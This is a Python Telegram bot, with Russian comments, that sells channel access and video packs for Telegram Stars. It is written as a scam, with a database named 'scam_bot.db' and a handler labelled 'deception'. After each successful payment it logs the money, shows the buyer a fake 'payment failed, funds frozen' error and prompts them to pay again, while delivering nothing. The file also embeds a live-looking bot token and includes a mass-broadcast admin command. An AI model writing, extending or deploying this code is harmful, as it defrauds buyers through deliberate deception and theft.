import asyncio
import logging
import sqlite3
from datetime import datetime
from aiogram import Bot, Dispatcher, F, Router
from aiogram.types import Message, CallbackQuery, LabeledPrice, PreCheckoutQuery, InlineKeyboardButton, InlineKeyboardMarkup
from aiogram.filters import Command
from aiogram.utils.keyboard import InlineKeyboardBuilder

logging.basicConfig(level=logging.INFO)

# ТОКЕН И АДМИН
BOT_TOKEN = "8237086271:AAFOo4KN1Xpht9iQB9zlk2NKX3D1dq1NND0"
ADMIN_ID = 6893832048

router = Router()

# НАСТРОЙКА БАЗЫ ДАННЫХ
conn = sqlite3.connect('scam_bot.db', check_same_thread=False)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS payments (user_id INT, amount INT, charge_id TEXT, date TEXT)''')
c.execute('''CREATE TABLE IF NOT EXISTS users (user_id INT PRIMARY KEY, join_date TEXT)''')
c.execute('''CREATE TABLE IF NOT EXISTS products (name TEXT, price INT)''')
c.execute("INSERT OR IGNORE INTO products VALUES ('Доступ к каналу', 50), ('1000 видео', 25), ('500 видео', 10)")
conn.commit()

# КЛАВИАТУРА МАГАЗИНА
def store_keyboard():
    builder = InlineKeyboardBuilder()
    c.execute("SELECT name, price FROM products")
    for prod_name, prod_price in c.fetchall():
        builder.button(text=f"{prod_name} - {prod_price}⭐", callback_data=f"buy_{prod_name}")
    builder.button(text="🛒 Мои заказы", callback_data="my_orders")
    builder.adjust(1)
    return builder.as_markup()

# КОМАНДА /start
@router.message(Command("start"))
async def start_cmd(message: Message):
    c.execute("INSERT OR IGNORE INTO users (user_id, join_date) VALUES (?, ?)", (message.from_user.id, datetime.now().isoformat()))
    conn.commit()
    await message.answer(
        f"🛒 **Магазин**\n\nВыберите товар для покупки. После оплаты вы получите продукт.\n\n⚠️ **Внимание:** Возможны задержки из-за нагрузки на сервер.",
        reply_markup=store_keyboard(),
        parse_mode="Markdown"
    )

# ПОКУПКА ТОВАРА
@router.callback_query(F.data.startswith("buy_"))
async def buy_process(callback: CallbackQuery):
    product = callback.data.split("_", 1)[1]
    c.execute("SELECT price FROM products WHERE name=?", (product,))
    price = c.fetchone()[0]
    await callback.message.answer_invoice(
        title=f"Покупка: {product}",
        description=f"Мгновенная доставка после оплаты.",
        provider_token="",
        currency="XTR",
        prices=[LabeledPrice(label=product, amount=price)],
        payload=f"payload_{product}_{callback.from_user.id}"
    )

# ПОДТВЕРЖДЕНИЕ ОПЛАТЫ
@router.pre_checkout_query()
async def pre_checkout(pre_checkout_query: PreCheckoutQuery):
    await pre_checkout_query.answer(ok=True)

# УСПЕШНАЯ ОПЛАТА (ОБМАН)
@router.message(F.successful_payment)
async def successful_payment(message: Message):
    c.execute("INSERT INTO payments (user_id, amount, charge_id, date) VALUES (?, ?, ?, ?)",
              (message.from_user.id, message.successful_payment.total_amount,
               message.successful_payment.telegram_payment_charge_id, datetime.now().isoformat()))
    conn.commit()
    
    error_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔄 Повторить оплату", callback_data="retry_payment")]
    ])
    await message.answer(
        f"❌ **Ошибка обработки платежа**\n\nТранзакция #TX{message.successful_payment.telegram_payment_charge_id[-8:]} не удалась. Средства временно заморожены. Пожалуйста, повторите оплату.",
        reply_markup=error_kb,
        parse_mode="Markdown"
    )

# ПОВТОРНАЯ ОПЛАТА
@router.callback_query(F.data == "retry_payment")
async def retry_payment(callback: CallbackQuery):
    await callback.message.answer("⚠️ Используйте /start чтобы выбрать товар заново.")

# АДМИН: ИЗМЕНИТЬ ЦЕНУ
@router.message(Command("setprice"))
async def admin_setprice(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    try:
        _, name, price = message.text.split()
        price = int(price)
        c.execute("UPDATE products SET price = ? WHERE name = ?", (price, name))
        conn.commit()
        await message.answer(f"✅ Цена '{name}' изменена на {price}⭐")
    except:
        await message.answer("❌ Формат: /setprice Название 100")

# АДМИН: ПЕРЕИМЕНОВАТЬ ТОВАР
@router.message(Command("renameproduct"))
async def admin_rename(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    try:
        _, old_name, new_name = message.text.split(maxsplit=2)
        c.execute("UPDATE products SET name = ? WHERE name = ?", (new_name, old_name))
        conn.commit()
        await message.answer(f"✅ Товар '{old_name}' переименован в '{new_name}'")
    except:
        await message.answer("❌ Формат: /renameproduct Старое_название Новое_название")

# АДМИН: СТАТИСТИКА
@router.message(Command("stats"))
async def admin_stats(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    c.execute("SELECT COUNT(*) FROM users")
    users = c.fetchone()[0]
    c.execute("SELECT COUNT(*), SUM(amount) FROM payments")
    pays, stars = c.fetchone()
    stars = stars if stars else 0
    await message.answer(f"📊 **Статистика**\n👥 Пользователей: {users}\n💰 Платежей: {pays}\n⭐️ Всего звёзд: {stars}")

# АДМИН: РАССЫЛКА
@router.message(Command("broadcast"))
async def admin_broadcast(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    broadcast_text = message.text.split(' ', 1)[1] if ' ' in message.text else None
    if not broadcast_text:
        await message.answer("❌ Формат: /broadcast Ваш текст")
        return
    
    c.execute("SELECT user_id FROM users")
    users = c.fetchall()
    sent = 0
    for (user_id,) in users:
        try:
            await bot.send_message(user_id, broadcast_text)
            sent += 1
        except:
            pass
    await message.answer(f"✅ Рассылка отправлена {sent}/{len(users)} пользователям")

# ЗАПУСК
async def main():
    global bot
    bot = Bot(token=BOT_TOKEN)
    dp = Dispatcher()
    dp.include_router(router)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
